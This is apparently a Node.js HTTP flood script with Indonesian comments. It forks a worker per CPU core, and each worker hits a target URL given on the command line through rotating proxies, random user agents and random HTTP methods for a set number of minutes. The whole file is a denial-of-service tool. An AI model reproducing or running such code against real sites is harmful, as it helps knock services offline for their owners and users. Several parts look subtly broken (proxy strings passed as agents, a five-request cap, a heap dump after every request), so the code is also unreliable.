const cluster = require('cluster');
const fs = require('fs');
const axios = require('axios');
const { cpus } = require('os');
const heapdump = require('heapdump'); // Tambahkan heapdump
const numCPUs = cpus().length;

const httpMethods = ['GET', 'HEAD', 'OPTIONS', 'TRACE', 'OPTIONS', 'POST'];
const userAgents = fs.readFileSync('user-agents.txt', 'utf-8').split('\n').filter(Boolean);
const proxies = fs.readFileSync('proxxy.txt', 'utf-8').split('\n').filter(Boolean);
const targetURL = process.argv[2];

if (cluster.isMaster) {
    console.log('suad jalan');
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  cluster.on('exit', (worker, code, signal) => {
    // console.log(`Worker ${worker.process.pid} died`);
  });
} else {
  const maxRequests = 5;
  const intervalTime = 0;
  const maxRuntime = process.argv[3] * 60000;

  let requestCount = 0;

  async function makeRequest() {
    try {
      const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
      const randomHttpMethod = httpMethods[Math.floor(Math.random() * httpMethods.length)];

      const response = await axios.get(targetURL, {
        rejectUnauthorized: false,
        method: randomHttpMethod,
        headers: {
          'User-Agent': randomUserAgent,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-us,en;q=0.5',
          'Accept-Encoding': 'gzip,deflate',
          'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
          'Keep-Alive': '115',
          'Connection': 'keep-alive'
        },
        httpsAgent: randomProxy
      });

      requestCount++;

      // Hapus sumber daya yang tidak lagi diperlukan setelah setiap permintaan
      response.data = null;
      response.headers = null;

      if (requestCount < maxRequests && process.uptime() * 1000 < maxRuntime) {
        // Trigger heap dump setiap kali membuat permintaan
        heapdump.writeSnapshot();

        setTimeout(makeRequest, intervalTime);
      } else {
        process.disconnect();
      }
    } catch (error) {
      // console.error(`Worker ${process.pid} - Error: ${error.message}`);
      // process.disconnect();
    }
  }

  async function run() {
    while (requestCount < maxRequests && process.uptime() * 1000 < maxRuntime) {
      await makeRequest();
    }

    process.disconnect();
  }

  run();
}
